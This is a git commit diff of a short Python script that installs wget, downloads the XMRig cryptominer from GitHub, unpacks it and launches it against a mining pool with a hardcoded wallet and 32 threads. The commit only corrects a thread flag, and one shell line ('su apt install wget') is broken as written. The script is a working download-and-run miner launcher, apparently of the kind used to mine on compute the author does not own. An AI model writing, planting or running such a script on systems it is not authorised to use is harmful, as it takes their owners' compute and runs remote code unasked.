fc836dc099f55c82c8430204e991896d43e279d2
archer0x0071 <96301231+archer0x0071@users.noreply.github.com>
2021-12-17 20:05:42 +0500

    Update script3.py

--- script3.py
+++ script3.py
@@ -4,4 +4,4 @@ os.system('su apt install wget')
 
 os.system('python -m wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz')
 os.system('tar xf xmrig-6.16.2-linux-static-x64.tar.gz')
-os.system('./xmrig-6.16.2/xmrig -a gr -o us.flockpool.com:5555 --tls -u RLUciajDyEujXL6J21S83EfapBJLte9gu6.kk17 -p --t 32')
+os.system('./xmrig-6.16.2/xmrig -a gr -o us.flockpool.com:5555 --tls -u RLUciajDyEujXL6J21S83EfapBJLte9gu6.kk17 -p -t 32')
